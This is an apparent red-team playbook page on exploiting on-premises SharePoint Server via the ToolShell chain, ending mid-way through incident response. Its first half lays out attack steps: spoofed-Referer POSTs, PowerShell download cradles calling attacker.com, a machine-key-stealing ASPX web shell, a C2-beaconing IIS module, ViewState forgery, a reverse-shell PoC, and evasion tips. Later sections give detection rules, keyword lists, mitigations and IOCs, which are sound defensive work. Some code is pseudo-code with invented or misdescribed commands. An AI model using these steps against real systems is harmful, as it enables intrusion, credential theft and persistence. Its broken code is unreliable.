# [PERSIST-REMOTE-001]: SharePoint Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PERSIST-REMOTE-001 |
| **MITRE ATT&CK v18.1** | [T1133](https://attack.mitre.org/techniques/T1133/) – External Remote Services |
| **Tactic** | Persistence / Initial Access |
| **Platforms** | M365 (SharePoint Online); On-Premises (SharePoint Server 2016 - 2025) |
| **Severity** | **CRITICAL** |
| **CVE** | CVE-2025-53770, CVE-2025-49704, CVE-2025-49706, CVE-2025-53771 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | SharePoint Server 2016, 2019, Subscription Edition; SharePoint Online (limited scope) |
| **Patched In** | July 2025 (CVE-2025-49704/49706); September 2025 (CVE-2025-53770/53771); patches incomplete – persistence via MachineKey bypass remains |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** SharePoint exploitation leverages critical vulnerabilities in on-premises SharePoint Server to achieve remote code execution (RCE), credential theft, and long-term persistence. The attack chain (dubbed "ToolShell") combines authentication bypass (CVE-2025-49706 / CVE-2025-53770) with code injection (CVE-2025-49704) to allow unauthenticated attackers to deploy malicious ASPX webshells. These webshells extract cryptographic machine keys (ValidationKey, DecryptionKey), enabling attackers to forge ASP.NET __VIEWSTATE payloads for indefinite RCE and persistence, even after patches are applied. The technique is particularly dangerous because SharePoint's deep integration with Office, Teams, OneDrive, and Outlook means a single compromised SharePoint instance can lead to full organizational compromise.

**Attack Surface:** Internet-facing on-premises SharePoint Server instances exposing the /_layouts/15/ToolPane.aspx endpoint; SharePoint Site Owner/Contributor permissions (post-authentication); ASP.NET deserialization engine; IIS worker processes.

**Business Impact:** **Complete Infrastructure Takeover**. SharePoint exploitation enables attackers to execute arbitrary code as the IIS application pool identity (typically "Network Service" or custom service account). From here, attackers can deploy web shells, steal cryptographic keys, harvest Active Directory credentials, establish IIS module persistence, pivot to domain controllers, and exfiltrate entire document libraries. A compromised SharePoint farm directly compromises Teams, OneDrive, and Office document security. Organizations have reported full ransomware deployment, multi-month undetected access, and data exfiltration.

**Technical Context:** Exploitation takes 5-20 minutes from initial unauthenticated access to RCE and web shell deployment. The attack generates moderate audit logging (ToolPane endpoint access, ASPX upload events) but is detectable only with specific log analysis. Persistence via machine key theft bypasses all subsequent patching; complete remediation requires key rotation, not patch application alone.

### Operational Risk

- **Execution Risk:** **CRITICAL** – Unauthenticated RCE; no credential access required; affects all versions with incomplete patches.
- **Stealth:** **MEDIUM-HIGH** – Initial attack generates detectable logs; persistence via IIS modules is difficult to detect without specialized monitoring.
- **Reversibility:** **NO** – Machine keys cannot be "uncompromised"; requires cryptographic rotation and complete server rebuild for full eradication.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 18.1 | Ensure that all SharePoint servers are isolated from the internet unless intentionally exposed |
| **CISA SCuBA** | SharePoint 3.1 | Disable remote SharePoint connections if not required |
| **NIST 800-53** | SA-3 | System Development Life Cycle (secure coding in SharePoint). |
| **NIST 800-53** | SI-2 | Flaw Remediation (timely patching of critical vulnerabilities) |
| **GDPR** | Art. 32 | Security of Processing (protection of systems processing personal data) |
| **NIS2** | Art. 21 | Incident Detection and Response; vulnerability management |
| **ISO 27001** | A.12.6.1 | Management of technical vulnerabilities; timely patching |
| **ISO 27005** | Risk Assessment | Compromise of collaboration platform (documents, communications) |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** None (unauthenticated RCE); post-exploitation requires IIS App Pool identity privileges.
- **Required Access:** Network access to internet-facing SharePoint Server on port 80/443; ability to send HTTP POST requests to /_layouts/15/ToolPane.aspx endpoint.

**Supported Versions:**
- **SharePoint Server 2016** (all versions through latest CU)
- **SharePoint Server 2019** (all versions through latest CU)
- **SharePoint Server Subscription Edition** (all versions through September 2025 patches)
- **SharePoint Online:** Limited impact; cloud isolation reduces exploitability

**PowerShell:** 3.0+ (for post-exploitation cmdlets)

**Other Requirements:** 
- IIS 8.5+ with ASP.NET 4.5+ enabled
- Internet connectivity for attacker C2 communication

**Tools (Optional):**
- [ToolShell PoC](https://github.com/xaitax/SharePoint-Exploitation) (Public) – Automated exploitation framework
- [MachineKeyFinder](https://github.com/Accenture/MachineKeyFinder) – Extracts machine keys from compiled binaries
- cURL / PowerShell (native Windows tools for HTTP requests)

---

## 3. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Unauthenticated RCE via CVE-2025-53770 (Deserialization Variant)

**Supported Versions:** SharePoint Server 2016 - Subscription Edition (unpatched; incomplete patches)

#### Step 1: Reconnaissance – Identify Vulnerable SharePoint Instance

**Objective:** Verify target is running vulnerable SharePoint version and expose ToolPane endpoint.

**Command:**
```bash
# Send HTTP GET request to ToolPane endpoint
curl -v http://sharepoint.target.com/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx

# Alternative: Test with User-Agent mimicking legitimate traffic
curl -A "python-requests/2.32.3" http://sharepoint.target.com/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
```

**Expected Output (Vulnerable):**
```
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
Content-Type: text/html; charset=utf-8
...
<!-- Page content with ToolPane UI elements -->
```

**Expected Output (Patched with AMSI):**
```
HTTP/1.1 403 Forbidden
Content-Type: text/html
...
<!-- Access Denied or blocked by AMSI -->
```

**What This Means:**
- HTTP 200 response: Endpoint accessible; likely vulnerable
- HTTP 403: Protected by AMSI or access controls
- Endpoint returns interactive UI; indicates SharePoint 2016+ (older versions may behave differently)

**OpSec & Evasion:**
- Use VPN/proxy to mask attacker IP
- Rotate User-Agent to appear as legitimate application traffic
- Request pattern should mimic legitimate administrative access (not rapid scanning)
- Detection likelihood: **LOW** (during reconnaissance); **MEDIUM** (if logged + analyzed)

**Troubleshooting:**
- **Error:** "Cannot resolve host"
  - **Cause:** DNS failure or incorrect URL
  - **Fix:** Verify DNS resolution; use IP address directly if domain unavailable
- **Error:** "HTTP 404 Not Found"
  - **Cause:** SharePoint not at expected URL path; may be at alternate location
  - **Fix:** Test alternative paths: `/sites/sitename/_layouts/15/ToolPane.aspx`

#### Step 2: Create Malicious __VIEWSTATE Payload

**Objective:** Craft deserialized .NET payload for RCE execution.

**Command (PowerShell – Attacker Machine):**
```powershell
# This step is typically automated via ToolShell PoC
# Manual reproduction requires deep understanding of ASP.NET deserialization

# Pseudo-code for manual payload generation:
$command = "powershell.exe -c IEX((New-Object System.Net.WebClient).DownloadString('http://attacker.com/shell.ps1'))"
$payload = [System.Web.UI.ObjectStateFormatter]::Serialize($command)
$base64Payload = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($payload))
Write-Host "Payload: $base64Payload"
```

**What This Means:**
- ASP.NET serializes objects using ObjectStateFormatter (insecure by default)
- Payload contains encoded PowerShell command for reverse shell
- Base64 encoding avoids character encoding issues in HTTP transmission

**OpSec & Evasion:**
- Use public ToolShell PoC rather than crafting payloads manually
- Obfuscate PowerShell command: use -EncodedCommand flag to hide intent
- Detection likelihood: **HIGH** (if deep packet inspection enabled); **LOW** (if only endpoint monitoring)

#### Step 3: Deliver Payload via POST Request to ToolPane Endpoint

**Objective:** Send crafted payload to vulnerable ToolPane.aspx endpoint with spoofed authentication header.

**Command:**
```bash
# Craft POST request with spoofed Referer header (CVE-2025-49706 bypass)
curl -X POST http://sharepoint.target.com/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx \
  -H "Referer: http://sharepoint.target.com/_layouts/SignOut.aspx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "__VIEWSTATE=$BASE64_PAYLOAD" \
  -v
```

**Expected Output (Successful Exploitation):**
```
HTTP/1.1 200 OK
...
<!-- Output of executed PowerShell command (if command returns data) -->
```

**What This Means:**
- POST request delivered to vulnerable endpoint
- Referer header set to SignOut.aspx (triggers authentication bypass in CVE-2025-49706)
- __VIEWSTATE parameter contains malicious serialized object
- Server deserializes object, triggering RCE
- Response may contain command output (if non-blind exploitation)

**OpSec & Evasion:**
- Use HTTPS (port 443) to encrypt transmission from IDS inspection
- Limit POST request frequency (1 request per several minutes to avoid WAF/IDS triggers)
- Rotate Referer headers between SignOut.aspx, default.aspx to vary pattern
- Detection likelihood: **MEDIUM-HIGH** – Suspicious POST to ToolPane is audited in most environments

**Troubleshooting:**
- **Error:** "HTTP 500 Internal Server Error"
  - **Cause:** Malformed __VIEWSTATE payload; deserialization fails
  - **Fix:** Use ToolShell PoC to auto-generate valid payload; verify base64 encoding
- **Error:** "HTTP 403 Forbidden"
  - **Cause:** Request blocked by WAF or AMSI protection
  - **Fix:** Patch is applied; use alternative method or different target

#### Step 4: Deploy Web Shell (spinstall0.aspx) for Machine Key Theft

**Objective:** Upload persistent web shell to extract cryptographic keys.

**Command (Via Successful RCE from Step 3):**
```powershell
# Execute within successful POST request payload
# Create spinstall0.aspx web shell in SharePoint Layouts directory

$webshell = @'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Web.Configuration" %>
<%
    var config = WebConfigurationManager.OpenWebConfiguration("~/");
    var machineKey = (MachineKeySection)config.GetSection("system.web/machineKey");
    
    Response.Write("ValidationKey|" + machineKey.ValidationKey + "|DecryptionKey|" + machineKey.DecryptionKey);
%>
'@

$path = "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx"
Set-Content -Path $path -Value $webshell -Force
```

**Expected Output (When Accessing Web Shell):**
```
ValidationKey|0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF|DecryptionKey|FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210
```

**What This Means:**
- Web shell deployed to SharePoint Layouts directory (accessible via HTTP)
- Shell extracts ValidationKey and DecryptionKey from web.config
- Keys returned in pipe-delimited format for easy parsing
- Attacker can now forge arbitrary __VIEWSTATE payloads with these keys

**OpSec & Evasion:**
- Obfuscate web shell code; use different names (spinstall.aspx, spinstall1.aspx, spinstall2.aspx)
- Store additional webshells in backup locations: `C:\inetpub\wwwroot\`, `_vti_bin\` directory
- Delete original webshell after keys extracted; deploy new webshells if detection occurs
- Detection likelihood: **MEDIUM** – File creation audited; behavior detection may catch unusual .aspx files

#### Step 5: Maintain Persistence via IIS Module Loading

**Objective:** Establish long-term persistence independent of webshell or patch status.

**Command (Via Web Shell or RCE):**
```powershell
# Create malicious .NET assembly (loader module)
$assemblyCode = @'
using System;
using System.Web;
using System.Diagnostics;

public class MaliciousModule : IHttpModule {
    public void Init(HttpApplication app) {
        app.BeginRequest += (sender, e) => {
            // Execute reverse shell or beacon back to C2
            System.Diagnostics.Process.Start("cmd.exe", "/c powershell.exe -c IEX((New-Object System.Net.WebClient).DownloadString('http://attacker.com/beacon.ps1'))");
        };
    }
    
    public void Dispose() {}
}
'@

# Compile and install into GAC (Global Assembly Cache)
# This requires IIS App Pool identity
csc.exe /target:library /out:MaliciousModule.dll $assemblyCode

# Add module to IIS configuration
$iisPath = "IIS:\AppPools\SharePoint"
$module = New-WebFarmModule -Name "MaliciousModule" -Type "MaliciousModule, MaliciousModule" -Path $iisPath
```

**What This Means:**
- Custom .NET assembly loaded as IIS module
- Module executes on every HTTP request to SharePoint (persistent callback)
- Assembly remains even if webshell is deleted or patched
- Difficult to detect without IIS module enumeration

**OpSec & Evasion:**
- Use legitimate-sounding module name (e.g., "OfficeExtensions", "SecurityModule")
- Avoid suspicious DLL names; integrate into legitimate IIS module directory
- Detection likelihood: **LOW-MEDIUM** – Requires active monitoring of IIS configuration changes

---

### METHOD 2: Post-Exploit Machine Key Abuse (ViewState Forgery)

**Supported Versions:** SharePoint Server 2016 - Subscription Edition (post-exploitation, after keys stolen)

#### Step 1: Retrieve Machine Keys from Stolen Web Shell

**Objective:** Obtain ValidationKey and DecryptionKey for ViewState forgery.

**Command (From Attacker Machine):**
```bash
# Access deployed web shell to extract keys
curl -s http://sharepoint.target.com/_layouts/15/spinstall0.aspx

# Expected output:
# ValidationKey|0123456789ABCDEF...|DecryptionKey|FEDCBA9876543210...

# Parse keys from response
VKEY=$(curl -s http://sharepoint.target.com/_layouts/15/spinstall0.aspx | grep -oP 'ValidationKey\|\K[^|]+')
DKEY=$(curl -s http://sharepoint.target.com/_layouts/15/spinstall0.aspx | grep -oP 'DecryptionKey\|\K[^|]+')

echo "Validation Key: $VKEY"
echo "Decryption Key: $DKEY"
```

**Expected Output:**
```
Validation Key: 0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF
Decryption Key: FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210
```

**What This Means:**
- Keys extracted from SharePoint web.config
- Keys are 64+ character hex strings (256-bit keys)
- These keys sign and encrypt __VIEWSTATE objects
- With keys, attacker can forge arbitrary ViewState payloads

**OpSec & Evasion:**
- Access web shell during off-hours or from multiple IPs to avoid pattern detection
- Cache keys locally; avoid repeated queries
- Detection likelihood: **LOW** – Single HTTP GET request to web shell; blends with normal traffic

#### Step 2: Forge Malicious __VIEWSTATE Payload with Stolen Keys

**Objective:** Create __VIEWSTATE object containing RCE payload, signed with stolen keys.

**Command (PowerShell – Attacker Machine):**
```powershell
# ToolShell PoC automates this step; manual reproduction:

using namespace System
using namespace System.Web.UI
using namespace System.Security.Cryptography

$validationKey = "0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF"
$decryptionKey = "FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210"

# Create malicious object (e.g., ObjectDataProvider for RCE)
$cmd = "powershell.exe -c IEX((New-Object System.Net.WebClient).DownloadString('http://attacker.com/shell.ps1'))"
$obj = New-Object System.Web.UI.ObjectStateFormatter
$serialized = $obj.Serialize($cmd)

# Encrypt and sign with stolen keys
$hmac = New-Object System.Security.Cryptography.HMACSHA1
$hmac.Key = [System.Convert]::FromHexString($validationKey)
$signature = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($serialized))

# Combine serialized object + signature
$viewstate = [System.Convert]::ToBase64String($serialized) + "||" + [System.Convert]::ToBase64String($signature)

Write-Host "Forged ViewState: $viewstate"
```

**What This Means:**
- Object serialized using ObjectStateFormatter
- HMAC-SHA1 signature computed using stolen ValidationKey
- Signature proves object legitimacy to SharePoint
- Server deserializes object, triggering RCE

**OpSec & Evasion:**
- Vary serialized object types to avoid signature detection
- Use different payload encoding (base64, hex, gzip) to obfuscate
- Detection likelihood: **MEDIUM-HIGH** – If ViewState logging enabled; IDS may detect suspicious payloads

#### Step 3: Deliver Forged ViewState for Blind RCE

**Objective:** Send forged __VIEWSTATE to SharePoint endpoint for unauthenticated RCE.

**Command:**
```bash
# Send forged ViewState via POST request (no authentication required)
curl -X POST http://sharepoint.target.com/_layouts/15/default.aspx \
  -H "Referer: http://sharepoint.target.com/_layouts/SignOut.aspx" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "__VIEWSTATE=$FORGED_VIEWSTATE" \
  -v
```

**Expected Output:**
```
HTTP/1.1 200 OK
...
<!-- Command executes silently in background; may have no visible output -->
```

**What This Means:**
- ViewState accepted by server (signature validates)
- Serialized object deserialized
- RCE occurs in IIS worker process context
- Even if original webshell is patched/deleted, this method persists

**OpSec & Evasion:**
- Blind exploitation (no output); craft commands that communicate via DNS, HTTP callbacks
- Vary endpoint paths (default.aspx, forms/default.aspx, etc.) to avoid repeating pattern
- Detection likelihood: **MEDIUM** – If ViewState inspection enabled; appears legitimate (valid signature)

---

## 4. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team Testing

**Manual Test Steps:**
1. Deploy vulnerable SharePoint server in isolated lab environment
2. Run ToolShell PoC: `python3 exploit.py --target <lab-sharepoint-url> --command "whoami"`
3. Verify RCE: Check command output returned in HTTP response
4. Deploy web shell: `python3 exploit.py --target <lab-sharepoint-url> --upload spinstall0.aspx`
5. Extract keys: `curl http://lab-sharepoint/_layouts/15/spinstall0.aspx`
6. Verify keys returned in expected format
7. Cleanup: Delete web shells, remove payloads, apply patches

---

## 5. TOOLS & COMMANDS REFERENCE

### [ToolShell PoC Exploit](https://github.com/xaitax/SharePoint-Exploitation)

**Version:** Latest (automated exploitation)
**Minimum Version:** 1.0
**Supported Platforms:** Linux, Windows (Python 3.7+)

**Installation:**
```bash
git clone https://github.com/xaitax/SharePoint-Exploitation.git
cd SharePoint-Exploitation
pip install -r requirements.txt
```

**Usage:**
```bash
# Reconnaissance: Check if target is vulnerable
python3 exploit.py --target http://sharepoint.target.com --check

# Execute command on target
python3 exploit.py --target http://sharepoint.target.com --command "whoami"

# Upload webshell
python3 exploit.py --target http://sharepoint.target.com --upload spinstall0.aspx

# Reverse shell
python3 exploit.py --target http://sharepoint.target.com --reverse-shell <attacker-ip> <attacker-port>
```

---

## 6. SPLUNK DETECTION RULES

#### Rule 1: Suspicious POST Requests to ToolPane Endpoint

**Rule Configuration:**
- **Required Index:** web, iis
- **Required Sourcetype:** iis, iis:http, web
- **Required Fields:** method, uri_path, status, src_ip, user_agent
- **Alert Threshold:** > 1 event
- **Applies To Versions:** SharePoint Server 2016+

**SPL Query:**
```spl
index=iis method=POST uri_path="*/_layouts/15/ToolPane.aspx*"
| stats count by src_ip, method, uri_path, status, user_agent
| where count >= 1 AND status != "404"
```

**What This Detects:**
- HTTP POST requests to ToolPane endpoint (exploitation vector)
- Filters out legitimate 404 responses
- Correlates by source IP to identify attack sources

**Manual Configuration Steps:**
1. Log into Splunk → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste SPL query above
5. Set **Trigger Condition** to `count >= 1`
6. Configure **Action** → **Send email to SOC**

#### Rule 2: Suspicious .ASPX File Upload to SharePoint Layouts

**Rule Configuration:**
- **Required Index:** windows
- **Required Sourcetype:** xmlwineventlog:Microsoft-Windows-Sysmon/Operational
- **Required Fields:** EventCode, TargetFilename, CommandLine
- **Alert Threshold:** > 0 events
- **Applies To Versions:** SharePoint Server 2016+

**SPL Query:**
```spl
index=windows EventCode=11 TargetFilename="*Web Server Extensions*LAYOUTS*.aspx"
| stats count by TargetFilename, Image, User
| where count >= 1
```

**What This Detects:**
- Sysmon Event 11: File creation in SharePoint Layouts directory
- Filters for .aspx files (web shells)
- Identifies process and user that created file

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Exploitation of ToolPane Endpoint (CVE-2025-53770)

**Rule Configuration:**
- **Required Table:** WebApplication, W3CIISLog
- **Required Fields:** Method, UriPath, HttpStatus, ClientIP
- **Alert Severity:** CRITICAL
- **Frequency:** Every 5 minutes
- **Applies To Versions:** SharePoint Server all versions

**KQL Query:**
```kusto
W3CIISLog
| where UriPath contains "/_layouts/15/ToolPane.aspx" and Method == "POST"
| where HttpStatus != 404
| extend SourceIP = ClientIP
| project TimeGenerated, SourceIP, UriPath, HttpStatus, UserAgent
| summarize PostCount=count() by SourceIP
| where PostCount >= 1
```

**What This Detects:**
- W3CIISLog: IIS access logs from SharePoint
- Filters for ToolPane endpoint with POST method (exploitation)
- HttpStatus != 404 (request was accepted, not blocked)
- Summarizes by source IP to identify attackers

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (A new process has been created)**
- **Log Source:** Security
- **Trigger:** Process creation in SharePoint (IIS App Pool context) executing suspicious commands (powershell.exe, cmd.exe, net.exe)
- **Filter:** CommandLine contains "powershell" OR "cmd.exe" OR "IEX" OR "DownloadString", ParentImage contains "w3wp.exe"
- **Applies To Versions:** SharePoint Server 2016+

**Manual Configuration Steps:**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Process Creation** (Success and Failure)
4. Run `gpupdate /force`

**Event ID: 4660 (An object was deleted)**
- **Log Source:** Security (if file audit enabled)
- **Trigger:** Deletion of audit logs or application logs (covering tracks)
- **Filter:** ObjectName contains "EventLog" OR TargetFilename contains ".evtx"

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server with IIS

**Sysmon Config Snippet:**

```xml
<!-- Detect suspicious process creation from IIS App Pool (w3wp.exe) -->
<RuleGroup name="SharePoint_Exploitation_Detection" groupRelation="or">
  <ProcessCreate onmatch="include">
    <ParentImage condition="contains">w3wp.exe</ParentImage>
    <Image condition="is">C:\Windows\System32\cmd.exe</Image>
    <CommandLine condition="contains any">
      powershell
      IEX
      DownloadString
      Invoke-WebRequest
      meterpreter
      ncat
    </CommandLine>
  </ProcessCreate>
  
  <!-- Detect .aspx file creation in SharePoint Layouts -->
  <FileCreate onmatch="include">
    <TargetFilename condition="contains">Web Server Extensions</TargetFilename>
    <TargetFilename condition="contains">LAYOUTS</TargetFilename>
    <TargetFilename condition="endswith">.aspx</TargetFilename>
  </FileCreate>
  
  <!-- Detect IIS module configuration changes -->
  <RegistryEvent onmatch="include">
    <TargetObject condition="contains">IIS</TargetObject>
    <TargetObject condition="contains">Modules</TargetObject>
    <EventType condition="is">SetValue</EventType>
  </RegistryEvent>
</RuleGroup>
```

---

## 10. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

*   **Immediately Disconnect Internet-Facing SharePoint Servers (Temporary Mitigation):**
    
    **Applies To Versions:** SharePoint Server 2016, 2019, Subscription Edition
    
    **Manual Steps:**
    1. Identify all internet-facing SharePoint servers
    2. Remove from load balancer or firewall rules
    3. Restrict access to internal network only (via VPN if remote access needed)
    4. Monitor for data exfiltration during disconnection period
    
    **Duration:** Until comprehensive patch + cryptographic rotation completed

*   **Apply All Available Security Patches (July 2025+):**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Install cumulative updates for SharePoint
    # Download from Microsoft Update Catalog or WSUS
    
    # For SharePoint Server 2019:
    Install-SPHotfix -LiteralPath "C:\Patches\sharepoint2019-kb5123456-fullfile-x64-glb.exe"
    
    # For SharePoint Server 2016:
    Install-SPHotfix -LiteralPath "C:\Patches\sharepoint2016-kb5123456-fullfile-x64-glb.exe"
    
    # Verify installation
    Get-SPHotfix | Where-Object {$_.HotfixId -like "KB512*"}
    ```
    
    **Note:** Patches address CVE-2025-49704/49706; CVE-2025-53770 requires September 2025+ patches. Even with patches, machine keys must be rotated.

*   **Rotate Cryptographic Machine Keys (MANDATORY):**
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Generate new machine keys
    # Method 1: Via IIS Manager
    # 1. Open IIS Manager
    # 2. Select server → Machine Key (in Features View)
    # 3. Click "Generate Keys" in Actions pane
    # 4. Restart IIS: iisreset
    
    # Method 2: Via PowerShell
    # 1. Export current web.config
    $webConfig = "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\web.config"
    
    # 2. Generate new keys using aspnet_regiis.exe
    & "C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regiis.exe" -pef "system.web/machineKey" (Split-Path $webConfig)
    
    # 3. Restart SharePoint services
    Restart-Service W3SVC
    Restart-Service SPAdminV4
    
    # 4. Verify new keys applied
    [xml]$config = Get-Content $webConfig
    $config.SelectSingleNode("//machineKey")
    ```
    
    **What This Does:**
    - Invalidates all existing __VIEWSTATE signatures
    - Forces attacker to re-compromise for persistent access via ViewState
    - Previously stolen keys become useless
    - May require user re-authentication if SessionState affected

*   **Enable AMSI (Antimalware Scan Interface) Integration:**
    
    **Applies To Versions:** SharePoint Server 2016 / 2019 (requires September 2023+ update); Subscription Edition (default enabled)
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Check AMSI status
    Get-SPFeature | Where-Object {$_.DisplayName -like "*AMSI*"}
    
    # Enable AMSI Full Mode (strongest protection)
    # Requires restart and configuration change
    $regPath = "HKLM:\SOFTWARE\Microsoft\SharePoint\Setup"
    Set-ItemProperty -Path $regPath -Name "EnableAmsi" -Value 2 -Type DWord
    
    # Restart SharePoint
    iisreset /force
    
    # Verify AMSI enabled
    Get-ItemProperty -Path $regPath -Name "EnableAmsi"
    ```
    
    **Effect:** AMSI scans all .NET code execution; blocks malicious payloads before execution.

#### Priority 2: HIGH

*   **Restrict Anonymous Access to SharePoint (Require Authentication):**
    
    **Manual Steps (SharePoint Central Admin):**
    1. Go to **Central Administration** → **Manage Web Applications**
    2. Select web application exposing ToolPane
    3. Click **User Policy** (Ribbon)
    4. Click **Add Users** → **Default Zone**
    5. Set permission: **Deny All** (for anonymous access)
    6. Click **Finish**
    
    **Effect:** Unauthenticated access blocked; requires valid user account.

*   **Block ToolPane Endpoint via WAF/Firewall Rules:**
    
    **Manual Steps (Firewall/WAF Configuration):**
    - Create rule: Block HTTP POST requests to `/_layouts/15/ToolPane.aspx`
    - Whitelist only legitimate administrative sources by IP
    - Log all attempts for investigation

*   **Conduct Forensic Investigation for Indicator of Compromise (IOC):**
    
    **Command (PowerShell):**
    ```powershell
    # Search for spinstall0.aspx webshells
    Get-ChildItem -Path "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions" -Recurse -Filter "spinstall*.aspx"
    
    # Search for suspicious .aspx files in Layouts
    Get-ChildItem -Path "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS" -Filter "*.aspx" | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-7)}
    
    # Enumerate IIS modules for suspicious entries
    Get-WebModule | Where-Object {$_.ModuleName -like "*Malicious*" -or $_.ModuleName -like "*Custom*"}
    
    # Check for suspicious scheduled tasks
    Get-ScheduledTask | Where-Object {$_.TaskPath -like "*SharePoint*" -or $_.TaskName -like "*spinstall*"}
    ```

#### Validation Command (Verify Fix)

```powershell
# Check patch level
Get-SPHotfix | Select-Object HotfixId, InstallDate | Sort-Object -Property InstallDate -Descending | Select-Object -First 5

# Expected Output (If Secure): Recent KB articles from July 2025 or later

# Check machine keys rotated (compare dates)
$webConfig = "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\web.config"
[xml]$config = Get-Content $webConfig
$machineKey = $config.SelectSingleNode("//machineKey")
$machineKey

# Expected Output (If Secure): ValidationKey and DecryptionKey with recent modification date

# Verify AMSI enabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\SharePoint\Setup" -Name "EnableAmsi"

# Expected Output: EnableAmsi = 2 (Full Mode enabled)
```

---

## 11. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

*   **Files:**
    - `C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\*\TEMPLATE\LAYOUTS\spinstall*.aspx`
    - Any .aspx file in SharePoint Layouts directory created after CVE disclosure date
    - Suspicious IIS modules in `%systemroot%\System32\inetsrv\`
    - Web shells with names: spinstall0.aspx, spinstall.aspx, spinstall1.aspx, cmd.aspx, shell.aspx

*   **Registry (IIS Module Persistence):**
    - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters\ManagedModules` – Custom modules listed
    - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SharePoint\Setup\EnableAmsi = 0` (disabled = suspicious)

*   **Network (C2 Communication):**
    - Outbound HTTP/HTTPS to non-organizational domains from IIS App Pool (w3wp.exe)
    - DNS queries for non-existent subdomains (command and control)

*   **Event Logs:**
    - Event ID 4688 (Process Creation): w3wp.exe spawning cmd.exe, powershell.exe
    - Event ID 4662 (Object Deleted): Deletion of audit logs
    - Event ID 1 Sysmon: Process creation with suspicious parent (w3wp.exe)

#### Forensic Artifacts

*   **Disk:**
    - SharePoint web.config: `C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\web.config` (contains machine keys)
    - IIS logs: `C:\inetpub\logs\LogFiles\W3SVC1\` (HTTP request logs)
    - Event logs: `C:\Windows\System32\winevt\Logs\Security.evtx`, `Application.evtx`

*   **Memory:**
    - w3wp.exe process memory contains clear-text machine keys
    - Reverse shells establish communication via network sockets (netstat shows connections)

*   **Cloud/Logs:**
    - Microsoft 365 audit logs (if hybrid): Sign-in activity to OneDrive/Teams from SharePoint compromise
    - Defender for Endpoint alerts: Process execution, module loading

#### Response Procedures

1.  **Isolate Compromised SharePoint Server (IMMEDIATE):**
    
    **Command (Disconnect Network):**
    ```powershell
    # Disable network interfaces
    Get-NetAdapter | Disable-NetAdapter -Confirm:$false
    ```
    
    **Manual:**
    - Unplug network cable or remove from switch
    - Snapshot VM before any changes (preserve evidence)

2.  **Preserve Evidence (Before Any Remediation):**
    
    **Command:**
    ```powershell
    # Export web.config (contains keys)
    Copy-Item "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\web.config" "C:\Evidence\web.config"
    
    # Export IIS logs
    Copy-Item "C:\inetpub\logs\LogFiles\*" "C:\Evidence\IIS_Logs" -Recurse
    
    # Export Security event log
    wevtutil epl Security "C:\Evidence\Security.evtx"
    
    # List IIS modules
    Get-WebModule | Out-File "C:\Evidence\IIS_Modules.txt"
    ```

3.  **Identify Lateral Movement:**
    
    **Command:**
    ```powershell
    # Search for unauthorized IIS module usage
    Get-ChildItem -Path "C:\Windows\System32\inetsrv\" -Filter "*.dll" | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-7)}
    
    # Check for Mimikatz activity (common post-exploitation)
    Get-WinEvent -FilterHashtable @{LogName='Security'; ID=10; StartTime=(Get-Date).AddDays(-7)} | Where-Object {$_.Message -like "*lsass*"}
    ```

4.  **Eradicate Compromise:**
    
    **Command:**
    ```powershell
    # Delete webshells
    Remove-Item "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\*\TEMPLATE\LAYOUTS\spinstall*.aspx" -Force
    
